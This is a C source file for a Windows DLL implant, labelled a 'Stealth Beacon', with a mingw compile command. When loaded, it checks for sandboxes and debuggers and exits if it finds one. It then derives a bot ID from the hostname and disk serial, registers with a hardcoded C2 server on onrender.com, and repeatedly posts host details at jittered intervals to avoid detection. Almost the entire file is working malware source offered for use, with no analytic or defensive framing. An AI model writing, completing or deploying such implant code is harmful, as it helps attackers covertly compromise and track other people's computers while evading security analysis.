/*
 * Windows Stealth Beacon - C Implementation
 * Compile: x86_64-w64-mingw32-gcc -shared -O2 -s -o dread.dll dread.c -lwinhttp -ladvapi32 -lkernel32 -luser32
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "advapi32.lib")

// ==================== CONFIGURATION ====================
#define C2_SERVER L"https://unimportant.onrender.com"
#define BEACON_ENDPOINT L"/beacon"
#define BOT_ID_ENDPOINT L"/register"
#define SLEEP_MIN 30000   // 30 seconds minimum
#define SLEEP_MAX 120000  // 2 minutes maximum
#define JITTER_FACTOR 0.3 // 30% jitter on top of random
// =======================================================

// Windows internal structures (not in standard headers)
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID EntryInProgress;
    BOOLEAN ShutdownInProgress;
    HANDLE ShutdownThreadId;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    union {
        LIST_ENTRY HashLinks;
        struct {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    };
    union {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    };
    PVOID EntryPointActivationContext;
    PVOID PatchInformation;
    LIST_ENTRY ForwarderLinks;
    LIST_ENTRY ServiceTagLinks;
    LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union {
        BOOLEAN BitField;
        struct {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN IsPackagedProcess : 1;
            BOOLEAN IsAppContainer : 1;
            BOOLEAN IsProtectedProcessLight : 1;
            BOOLEAN IsLongPathAwareProcess : 1;
        };
    };
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
    PVOID ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PVOID FastPebLock;
    PVOID AtlThunkSListPtr;
    PVOID IFEOKey;
    // ... truncated for brevity
} PEB, *PPEB;

// Global state
HANDLE g_hStopEvent = NULL;
HANDLE g_hBeaconThread = NULL;
WCHAR g_szBotId[64] = {0};
volatile BOOL g_bRunning = TRUE;

// Forward declarations
DWORD GetRandomDelay(DWORD minMs, DWORD maxMs);
BOOL SendBeacon(void);

// ==================== STEALTH UTILITIES ====================

/*
 * Generate a pseudo-unique bot ID based on machine info
 */
void GenerateBotId(LPWSTR buffer, DWORD bufferSize) {
    WCHAR hostname[256];
    DWORD hostLen = sizeof(hostname) / sizeof(WCHAR);
    
    GetComputerNameW(hostname, &hostLen);
    
    DWORD serial = 0;
    GetVolumeInformationW(L"C:\\", NULL, 0, &serial, NULL, NULL, NULL, 0);
    
    DWORD hash = 0;
    for (WCHAR* p = hostname; *p; p++) {
        hash = ((hash << 5) + hash) + *p;
    }
    hash ^= serial;
    hash = (hash ^ (hash >> 16)) & 0xFFFF;
    
    swprintf(buffer, bufferSize, L"KB%08X-%04X", serial & 0xFFFFFFFF, hash);
}

/*
 * Check if running in a VM/sandbox (basic evasion)
 */
BOOL IsSandboxed(void) {
    if (GetModuleHandleW(L"sbiedll.dll") != NULL) return TRUE;
    if (IsDebuggerPresent()) return TRUE;
    
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
    if (memStatus.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return TRUE;
    
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) return TRUE;
    
    return FALSE;
}

/*
 * Get random delay with jitter
 */
DWORD GetRandomDelay(DWORD minMs, DWORD maxMs) {
    srand(GetTickCount() ^ (DWORD)GetCurrentProcessId());
    return minMs + (rand() % (maxMs - minMs + 1));
}

// ==================== C2 COMMUNICATION ====================

/*
 * Register with C2 server
 */
BOOL RegisterWithC2(void) {
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL success = FALSE;
    
    // Parse URL components manually (avoid WinHttpCrackUrl dependency)
    WCHAR url[512];
    swprintf(url, 512, L"%s%s?bot=%s", C2_SERVER, BOT_ID_ENDPOINT, g_szBotId);
    
    // Simple extraction - assumes format http://host:port/path
    WCHAR host[256] = {0};
    URL_COMPONENTS urlComp = {0};
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.lpszHostName = host;
    urlComp.dwHostNameLength = 256;
    
    // Use WinHttpCrackUrl (link with -lwinhttp)
    if (!WinHttpCrackUrl(C2_SERVER, 0, 0, &urlComp)) {
        return FALSE;
    }
    
    hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME,
                           WINHTTP_NO_PROXY_BYPASS, 0);
    
    if (hSession) {
        hConnect = WinHttpConnect(hSession, host, urlComp.nPort, 0);
        if (hConnect) {
            WCHAR path[512];
            swprintf(path, 512, L"%s?bot=%s", BOT_ID_ENDPOINT, g_szBotId);
            
            hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL,
                                          WINHTTP_NO_REFERER,
                                          WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
            if (hRequest) {
                if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                       WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
                    if (WinHttpReceiveResponse(hRequest, NULL)) {
                        DWORD statusCode = 0;
                        DWORD size = sizeof(statusCode);
                        WinHttpQueryHeaders(hRequest, 
                                           WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                                           NULL, &statusCode, &size, NULL);
                        success = (statusCode == 200);
                    }
                }
                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    }
    
    return success;
}

/*
 * Send a beacon to the C2 server
 */
BOOL SendBeacon(void) {
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL success = FALSE;
    
    // Build POST data
    WCHAR postData[1024];
    DWORD tickCount = GetTickCount();
    DWORD uptime = tickCount / 1000 / 60;
    
    WCHAR processName[MAX_PATH];
    GetModuleFileNameW(NULL, processName, MAX_PATH);
    WCHAR* shortName = wcsrchr(processName, L'\\');
    if (shortName) shortName++; else shortName = processName;
    
    DWORD sessionId;
    ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);
    
    swprintf(postData, 1024,
             L"bot=%s&uptime=%lu&tick=%lu&proc=%s&session=%lu",
             g_szBotId, uptime, tickCount, shortName, sessionId);
    
    // Parse URL
    URL_COMPONENTS urlComp = {0};
    urlComp.dwStructSize = sizeof(urlComp);
    WCHAR host[256] = {0};
    urlComp.lpszHostName = host;
    urlComp.dwHostNameLength = 256;
    
    if (!WinHttpCrackUrl(C2_SERVER, 0, 0, &urlComp)) {
        return FALSE;
    }
    
    hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME,
                           WINHTTP_NO_PROXY_BYPASS, 0);
    
    if (hSession) {
        hConnect = WinHttpConnect(hSession, host, urlComp.nPort, 0);
        if (hConnect) {
            hRequest = WinHttpOpenRequest(hConnect, L"POST", BEACON_ENDPOINT, NULL,
                                          WINHTTP_NO_REFERER,
                                          WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
            if (hRequest) {
                LPCWSTR headers = L"Content-Type: application/x-www-form-urlencoded\r\n";
                DWORD dataLen = (DWORD)(wcslen(postData) * sizeof(WCHAR));
                
                if (WinHttpSendRequest(hRequest, headers, (DWORD)wcslen(headers),
                                       postData, dataLen, dataLen, 0)) {
                    if (WinHttpReceiveResponse(hRequest, NULL)) {
                        DWORD statusCode = 0;
                        DWORD size = sizeof(statusCode);
                        WinHttpQueryHeaders(hRequest,
                                           WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                                           NULL, &statusCode, &size, NULL);
                        success = (statusCode == 200);
                    }
                }
                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    }
    
    return success;
}

// ==================== MAIN BEACON LOOP ====================

DWORD WINAPI BeaconThread(LPVOID lpParam) {
    (void)lpParam;
    
    Sleep(GetRandomDelay(SLEEP_MIN / 2, SLEEP_MIN));
    
    RegisterWithC2();
    
    while (g_bRunning) {
        SendBeacon();
        
        DWORD baseSleep = GetRandomDelay(SLEEP_MIN, SLEEP_MAX);
        DWORD jitter = (DWORD)(baseSleep * ((double)rand() / RAND_MAX) * JITTER_FACTOR);
        DWORD sleepTime = baseSleep + jitter;
        
        DWORD slept = 0;
        while (slept < sleepTime && g_bRunning) {
            Sleep(1000);
            slept += 1000;
        }
    }
    
    return 0;
}

// ==================== DLL ENTRY POINT ====================

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    (void)lpReserved;
    
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hModule);
            
            if (IsSandboxed()) {
                return FALSE;
            }
            
            GenerateBotId(g_szBotId, sizeof(g_szBotId)/sizeof(WCHAR));
            
            g_hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
            g_hBeaconThread = CreateThread(NULL, 0, BeaconThread, NULL, 0, NULL);
            
            break;
            
        case DLL_PROCESS_DETACH:
            g_bRunning = FALSE;
            if (g_hStopEvent) SetEvent(g_hStopEvent);
            if (g_hBeaconThread) {
                WaitForSingleObject(g_hBeaconThread, 5000);
                CloseHandle(g_hBeaconThread);
            }
            if (g_hStopEvent) CloseHandle(g_hStopEvent);
            break;
            
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
